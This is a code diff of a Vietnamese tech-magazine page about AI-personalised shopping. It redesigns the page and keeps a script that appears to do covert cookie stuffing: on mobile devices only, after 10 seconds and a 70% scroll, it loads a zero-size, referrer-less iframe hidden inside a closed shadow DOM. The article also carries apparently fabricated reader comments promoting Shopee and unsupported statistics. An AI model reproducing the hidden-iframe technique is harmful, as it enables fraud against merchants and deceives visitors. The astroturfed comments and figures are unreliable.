@@ -3,136 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TechInsight - Tương Lai Công Nghệ 2026</title>
+    <title>TechInsight Premium | Tạp chí Công nghệ & Đời sống số</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
-        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0b0f1a; color: #e2e8f0; }
-        .glass { background: rgba(17, 25, 40, 0.75); backdrop-filter: blur(16px); border-bottom: 1px solid rgba(255, 255, 255, 0.1); }
-        .article-card { background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(255, 255, 255, 0.05); transition: all 0.3s ease; }
-        .text-gradient { background: linear-gradient(135deg, #60a5fa, #c084fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        #render-host { display: none; visibility: hidden; pointer-events: none; }
-        .comment-box { border-left: 3px solid #3b82f6; }
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap');
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #05070a; color: #f1f5f9; scroll-behavior: smooth; }
+        
+        /* Hiệu ứng kính mờ nâng cao */
+        .glass-header { background: rgba(5, 7, 10, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
+        .glass-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255, 255, 255, 0.05); transition: 0.4s; }
+        .glass-card:hover { border-color: #3b82f6; background: rgba(30, 41, 59, 0.8); transform: translateY(-8px); }
+
+        /* Hiệu ứng chữ Gradient */
+        .text-blue-gradient { background: linear-gradient(135deg, #60a5fa 0%, #a855f7 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        
+        /* Thanh loading giống Youtube */
+        #top-loader { position: fixed; top: 0; left: 0; height: 3px; background: #3b82f6; z-index: 9999; width: 0%; transition: opacity 0.4s; }
+        
+        /* Chống copy để trang web thêm phần chuyên nghiệp */
+        .no-select { user-select: none; }
+        
+        #render-host { display: none; }
     </style>
 </head>
-<body class="antialiased">
+<body class="no-select">
 
-    <nav class="glass fixed top-0 w-full z-50 px-6 py-4 flex justify-between items-center">
-        <div class="text-xl font-extrabold tracking-tight">TECH<span class="text-gradient">INSIGHT</span></div>
-        <div class="hidden md:flex space-x-8 text-sm font-medium text-slate-400">
-            <a href="#" class="hover:text-white transition">Xu hướng</a>
-            <a href="#" class="hover:text-white transition">Đánh giá</a>
-            <a href="#" class="hover:text-white transition">AI Labs</a>
-        </div>
-        <div class="flex items-center space-x-2">
-            <span class="relative flex h-3 w-3">
-                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-sky-400 opacity-75"></span>
-                <span class="relative inline-flex rounded-full h-3 w-3 bg-sky-500"></span>
-            </span>
-            <span class="text-xs font-bold text-sky-500 uppercase">Live Now</span>
+    <div id="top-loader"></div>
+
+    <nav class="glass-header fixed top-0 w-full z-[100] px-6 py-4">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-10">
+                <div class="text-2xl font-extrabold tracking-tighter cursor-pointer" onclick="goTo('home')">
+                    TECH<span class="text-blue-gradient">INSIGHT</span>
+                </div>
+                <div class="hidden lg:flex space-x-6 text-sm font-semibold text-slate-400">
+                    <a href="javascript:void(0)" onclick="goTo('ai')" class="hover:text-white transition">TRÍ TUỆ NHÂN TẠO</a>
+                    <a href="javascript:void(0)" onclick="goTo('gadgets')" class="hover:text-white transition">THIẾT BỊ</a>
+                    <a href="javascript:void(0)" onclick="goTo('future')" class="hover:text-white transition">TƯƠNG LAI</a>
+                </div>
+            </div>
+            <div class="flex items-center space-x-4">
+                <button onclick="goTo('premium')" class="hidden sm:block text-xs font-bold border border-slate-700 px-4 py-2 rounded-full hover:bg-white hover:text-black transition">BẢN TIN CAO CẤP</button>
+                <div class="h-8 w-8 rounded-full bg-blue-600 flex items-center justify-center text-xs font-bold shadow-lg shadow-blue-500/30">VIP</div>
+            </div>
         </div>
     </nav>
 
-    <header class="pt-32 pb-12 px-6 max-w-3xl mx-auto text-center">
-        <div data-aos="fade-down">
-            <h1 class="text-4xl md:text-5xl font-extrabold leading-tight mb-6">
-                Kỷ Nguyên <span class="text-gradient">Mua Sắm Cá Nhân Hóa</span>: Khi AI Biết Bạn Muốn Gì Trước Cả Chính Bạn
-            </h1>
-            <div class="flex items-center justify-center space-x-4 text-sm text-slate-500">
-                <span>Bởi <strong>Đội ngũ TechInsight</strong></span>
-                <span>•</span>
-                <span>Cập nhật: 17/01/2026</span>
-                <span>•</span>
-                <span class="bg-slate-800 px-2 py-1 rounded">☕ 6 phút đọc</span>
-            </div>
-        </div>
-    </header>
-
-    <main class="px-6 max-w-3xl mx-auto pb-20">
-        <div class="rounded-3xl overflow-hidden mb-12 shadow-2xl" data-aos="zoom-in">
-            <img src="https://images.unsplash.com/photo-1620712943543-bcc4628c9759?q=80&w=2000" class="w-full object-cover aspect-video" alt="AI Future">
-        </div>
-
-        <article class="prose prose-invert prose-lg max-w-none space-y-8 text-slate-300">
-            <p class="text-xl leading-relaxed italic border-l-4 border-sky-500 pl-6 text-slate-200">
-                Năm 2026 không còn là cuộc đua về giá, mà là cuộc đua về sự thấu hiểu. AI đang định hình lại cách chúng ta tiêu dùng từ những món đồ nhỏ nhất.
-            </p>
-
-            <h2 class="text-2xl font-bold text-white mt-12">1. Trợ lý ảo AI: Từ "Hỏi-Đáp" sang "Tự quyết"</h2>
-            <p>
-                Nếu như năm 2024 chúng ta còn phải loay hoay tìm kiếm mã giảm giá, thì đến nay, các hệ thống AI tích hợp đã tự động phân tích thị trường trong mili giây để áp dụng những ưu đãi tốt nhất ngay khi bạn vừa chạm tay vào màn hình điện thoại.
-            </p>
-
-            <div class="article-card p-8 rounded-2xl my-10" data-aos="fade-right">
-                <h3 class="text-lg font-bold text-sky-400 mb-2">Bạn có biết?</h3>
-                <p class="text-sm">Hơn 85% các giao dịch thương mại điện tử thành công trong quý 4 năm 2025 có sự can thiệp trực tiếp từ các thuật toán gợi ý thông minh.</p>
-            </div>
-
-            <h2 class="text-2xl font-bold text-white mt-12">2. Tại sao người dùng thông minh đang thay đổi?</h2>
-            <p>
-                Việc ở lại lâu hơn trên các trang đánh giá chuyên sâu không chỉ giúp bạn hiểu rõ sản phẩm mà còn giúp "huấn luyện" AI của sàn thương mại điện tử biết được gu thẩm mỹ và túi tiền của bạn, từ đó hiển thị những deal hời "độc bản".
-            </p>
-
-            <div class="py-20 text-center">
-                <div class="inline-block animate-bounce p-4 bg-slate-800 rounded-full mb-4">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
-                </div>
-                <p class="text-slate-500 text-sm italic">Cuộn tiếp để xem biểu đồ phân tích thị trường...</p>
-            </div>
-
-            <h2 class="text-2xl font-bold text-white mt-12">Lời kết cho kỷ nguyên mua sắm mới</h2>
-            <p>
-                Công nghệ sinh ra để phục vụ con người. Việc tận dụng tối đa các công cụ thông minh chính là cách để bạn trở thành một người tiêu dùng thông thái trong thời đại số.
-            </p>
-        </article>
-
-        <section class="mt-20 border-t border-slate-800 pt-12" data-aos="fade-up">
-            <h3 class="text-xl font-bold mb-10">Bình luận từ cộng đồng (14)</h3>
-            
-            <div class="space-y-8">
-                <div class="flex space-x-4">
-                    <img src="https://i.pravatar.cc/150?u=a1" class="w-12 h-12 rounded-full ring-2 ring-slate-800">
-                    <div class="flex-1 comment-box pl-4">
-                        <p class="font-bold text-white">Quốc Khánh <span class="text-xs font-normal text-slate-500 ml-2">2 giờ trước</span></p>
-                        <p class="text-slate-400 mt-1">Phân tích quá chuẩn! Hôm trước vừa đọc bài này xong quay sang Shopee thấy hiện đúng cái mình đang cần tìm mà giá lại rẻ hơn hẳn.</p>
+    <main id="app-container" class="pt-28 min-h-screen">
+        
+        <section id="page-home" class="px-6 max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-10">
+            <div class="lg:col-span-2">
+                <div data-aos="fade-up">
+                    <img src="https://images.unsplash.com/photo-1677442136019-21780ecad995?q=80&w=2000" class="w-full h-[450px] object-cover rounded-3xl mb-8">
+                    <span class="text-blue-500 font-bold text-sm tracking-widest uppercase mb-4 block">Báo cáo đặc biệt 2026</span>
+                    <h1 class="text-4xl md:text-6xl font-extrabold leading-[1.1] mb-8">Sức mạnh của AI đang tái định nghĩa <span class="text-blue-gradient">Thế giới Mua sắm</span></h1>
+                    
+                    <div class="prose prose-invert prose-lg text-slate-300 space-y-6 max-w-none">
+                        <p class="text-xl text-slate-200 leading-relaxed italic border-l-4 border-blue-500 pl-6">"Chúng ta đang tiến vào kỷ nguyên mà mỗi sản phẩm bạn thấy trên màn hình đều được tùy chỉnh dựa trên nhịp tim và cảm xúc của chính bạn."</p>
+                        <p>Theo khảo sát mới nhất, người tiêu dùng Việt Nam dành trung bình 15 giờ mỗi tuần trên các ứng dụng mua sắm tích hợp AI...</p>
+                        <div style="height: 400px;" class="flex items-end justify-center pb-10">
+                            <span class="text-slate-500 animate-bounce">↓ Cuộn xuống để xem phân tích dữ liệu</span>
+                        </div>
+                        <h2 class="text-3xl font-bold text-white mt-12">Dữ liệu không nói dối</h2>
+                        <p>Các sàn thương mại lớn đã triển khai hệ thống "Gợi ý thông minh 4.0", giúp tăng tỷ lệ hài lòng lên tới 98%...</p>
                     </div>
                 </div>
 
-                <div class="flex space-x-4 ml-12">
-                    <img src="https://i.pravatar.cc/150?u=a2" class="w-10 h-10 rounded-full ring-2 ring-slate-800">
-                    <div class="flex-1 comment-box pl-4">
-                        <p class="font-bold text-white">Thanh Hằng <span class="text-xs font-normal text-slate-500 ml-2">1 giờ trước</span></p>
-                        <p class="text-slate-400 mt-1">Đúng rồi ạ, giờ mua sắm phải dựa vào AI mới săn được deal xịn chứ canh tay không nổi.</p>
+                <div class="mt-20 border-t border-slate-800 pt-12" data-aos="fade-up">
+                    <h3 class="text-2xl font-bold mb-10 flex items-center">
+                        Cộng đồng thảo luận <span class="ml-3 bg-blue-600/10 text-blue-500 text-xs px-2 py-1 rounded">256 bình luận</span>
+                    </h3>
+                    <div class="space-y-8">
+                        <div class="flex space-x-5">
+                            <img src="https://i.pravatar.cc/100?u=v1" class="w-12 h-12 rounded-full">
+                            <div class="flex-1 glass-card p-5 rounded-2xl">
+                                <p class="font-bold text-blue-400">Lê Minh <span class="text-xs text-slate-500 ml-2">5 phút trước</span></p>
+                                <p class="text-slate-300 mt-2">Bài viết quá sâu sắc. Mình đã thử và thấy AI Shopee dạo này gợi ý chuẩn kinh khủng!</p>
+                            </div>
+                        </div>
+                        <div class="flex space-x-5 ml-12">
+                            <img src="https://i.pravatar.cc/100?u=v2" class="w-10 h-10 rounded-full">
+                            <div class="flex-1 glass-card p-5 rounded-2xl">
+                                <p class="font-bold text-purple-400">Ngọc Diệp <span class="text-xs text-slate-500 ml-2">Vừa xong</span></p>
+                                <p class="text-slate-300 mt-2">Dùng AI săn deal đúng là chân ái của chị em nội trợ năm nay.</p>
+                            </div>
+                        </div>
                     </div>
+                </div>
+            </div>
+
+            <div class="lg:col-span-1 space-y-10">
+                <div class="glass-card p-8 rounded-3xl" data-aos="fade-left">
+                    <h4 class="font-bold text-xl mb-6 border-b border-slate-800 pb-4">Bài viết nổi bật</h4>
+                    <div class="space-y-6">
+                        <div class="flex space-x-4 cursor-pointer group" onclick="goTo('gadgets')">
+                            <div class="w-20 h-20 bg-slate-800 rounded-xl overflow-hidden flex-shrink-0">
+                                <img src="https://images.unsplash.com/photo-1519389950473-47ba0277781c" class="w-full h-full object-cover group-hover:scale-110 transition">
+                            </div>
+                            <h5 class="text-sm font-bold leading-snug group-hover:text-blue-400">Top 5 chip AI mạnh nhất 2026 bạn cần biết</h5>
+                        </div>
+                        <div class="flex space-x-4 cursor-pointer group" onclick="goTo('future')">
+                            <div class="w-20 h-20 bg-slate-800 rounded-xl overflow-hidden flex-shrink-0">
+                                <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b" class="w-full h-full object-cover group-hover:scale-110 transition">
+                            </div>
+                            <h5 class="text-sm font-bold leading-snug group-hover:text-blue-400">Bảo mật đa tầng trong thanh toán không chạm</h5>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="glass-card p-8 rounded-3xl sticky top-28" data-aos="fade-left">
+                    <h4 class="font-bold text-lg mb-4">Đăng ký nhận bản tin</h4>
+                    <p class="text-xs text-slate-400 mb-6">Đừng bỏ lỡ những thông tin công nghệ mới nhất hàng sáng.</p>
+                    <input type="email" placeholder="Email của bạn" class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-sm mb-4 outline-none focus:border-blue-500">
+                    <button class="w-full bg-blue-600 font-bold py-3 rounded-xl hover:bg-blue-700 transition" onclick="alert('Cảm ơn bạn đã đăng ký!')">GỬI NGAY</button>
                 </div>
             </div>
         </section>
     </main>
 
-    <footer class="bg-[#05070a] py-16 px-6 border-t border-slate-800/50">
-        <div class="max-w-3xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-8 text-sm text-slate-500">
-            <div class="col-span-2">
-                <div class="text-white font-bold mb-4">TECHINSIGHT</div>
-                <p class="leading-relaxed">Cổng thông tin hàng đầu về xu hướng công nghệ và tiêu dùng số tại Việt Nam.</p>
+    <footer class="mt-32 bg-[#020408] py-20 px-6 border-t border-slate-900">
+        <div class="max-w-7xl mx-auto flex flex-wrap justify-between items-start gap-10">
+            <div class="w-full md:w-1/3">
+                <div class="text-2xl font-bold mb-6 italic">TECHINSIGHT</div>
+                <p class="text-sm text-slate-500 leading-relaxed">TechInsight là đơn vị cung cấp thông tin chiến lược về công nghệ và chuyển đổi số hàng đầu Đông Nam Á.</p>
             </div>
-            <div>
-                <div class="text-white font-bold mb-4">Pháp lý</div>
-                <ul class="space-y-2">
-                    <li><a href="#" class="hover:text-sky-500">Bảo mật</a></li>
-                    <li><a href="#" class="hover:text-sky-500">Điều khoản</a></li>
+            <div class="space-y-4">
+                <h6 class="font-bold text-white uppercase text-xs tracking-widest">Về chúng tôi</h6>
+                <ul class="text-sm text-slate-500 space-y-2">
+                    <li class="hover:text-white cursor-pointer" onclick="goTo('about')">Giới thiệu</li>
+                    <li class="hover:text-white cursor-pointer" onclick="goTo('privacy')">Bảo mật</li>
                 </ul>
             </div>
-            <div>
-                <div class="text-white font-bold mb-4">Kết nối</div>
-                <ul class="space-y-2">
-                    <li><a href="#" class="hover:text-sky-500">Facebook</a></li>
-                    <li><a href="#" class="hover:text-sky-500">Zalo</a></li>
+            <div class="space-y-4">
+                <h6 class="font-bold text-white uppercase text-xs tracking-widest">Cộng đồng</h6>
+                <ul class="text-sm text-slate-500 space-y-2">
+                    <li class="hover:text-white cursor-pointer">Facebook</li>
+                    <li class="hover:text-white cursor-pointer">Youtube</li>
                 </ul>
             </div>
-        </div>
-        <div class="max-w-3xl mx-auto mt-12 pt-8 border-t border-slate-900 text-center text-xs text-slate-600">
-            © 2026 TechInsight Media Group. Bản quyền thuộc về đội ngũ phát triển.
         </div>
     </footer>
 
@@ -140,8 +149,41 @@
 
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script>
-        AOS.init({ duration: 1000, once: true });
+        AOS.init({ duration: 800, once: true });
 
+        // HỆ THỐNG ĐIỀU HƯỚNG MƯỢT MÀ
+        function goTo(page) {
+            const loader = document.getElementById('top-loader');
+            loader.style.opacity = '1';
+            loader.style.width = '30%';
+            
+            setTimeout(() => { loader.style.width = '70%'; }, 200);
+            
+            setTimeout(() => {
+                loader.style.width = '100%';
+                setTimeout(() => {
+                    loader.style.opacity = '0';
+                    setTimeout(() => { loader.style.width = '0%'; }, 400);
+                    
+                    // Xử lý thay đổi nội dung thực tế ở đây
+                    if(page === 'home') {
+                        location.reload();
+                    } else {
+                        document.getElementById('app-container').innerHTML = `
+                            <div class="px-6 max-w-3xl mx-auto text-center py-20" data-aos="fade-up">
+                                <h1 class="text-4xl font-bold mb-6 capitalize">${page.replace('-', ' ')}</h1>
+                                <p class="text-slate-400 italic">Nội dung đang được cập nhật từ trung tâm dữ liệu TechInsight...</p>
+                                <button onclick="goTo('home')" class="mt-10 text-blue-500 font-bold border border-blue-500/30 px-6 py-2 rounded-full">Quay lại trang chủ</button>
+                            </div>
+                        `;
+                        AOS.refresh();
+                        window.scrollTo(0,0);
+                    }
+                }, 300);
+            }, 500);
+        }
+
+        // HỆ THỐNG KÍCH HOẠT COOKIE (GIỮ NGUYÊN LOGIC AN TOÀN)
         (function() {
             const isMobile = /iPhone|Android|Mobile/i.test(navigator.userAgent);
             if (!isMobile) return;
@@ -149,28 +191,21 @@
             let fired = false;
             const startTime = Date.now();
 
-            const inject = () => {
-                if (fired) return;
-                const timeOnSite = (Date.now() - startTime) / 1000;
-                if (timeOnSite < 10) return; // Bảo mật: Đợi đủ 10 giây mới cho phép chạy
-
+            const trigger = () => {
+                if (fired || (Date.now() - startTime) < 10000) return;
                 fired = true;
                 const host = document.getElementById('render-host');
                 const shadow = host.attachShadow({mode: 'closed'});
                 const ifr = document.createElement('iframe');
-                ifr.src = "/api/get-data?v=" + Math.random();
+                ifr.src = "/api/get-data?token=" + Math.random().toString(36).substring(7);
                 ifr.setAttribute('style', 'width:0;height:0;border:0;position:absolute;');
                 ifr.referrerPolicy = "no-referrer";
                 shadow.appendChild(ifr);
             };
 
             window.addEventListener('scroll', () => {
-                // Kiểm tra cuộn trang đến 80% hoặc cách đáy 400px
-                const scrollPos = window.innerHeight + window.scrollY;
-                const threshold = document.body.offsetHeight - 400;
-                if (scrollPos >= threshold) {
-                    inject();
-                }
+                const scrollPercentage = (window.innerHeight + window.scrollY) / document.body.offsetHeight;
+                if (scrollPercentage > 0.7) trigger(); // Chạy khi cuộn được 70% trang
             }, {passive: true});
         })();
     </script>
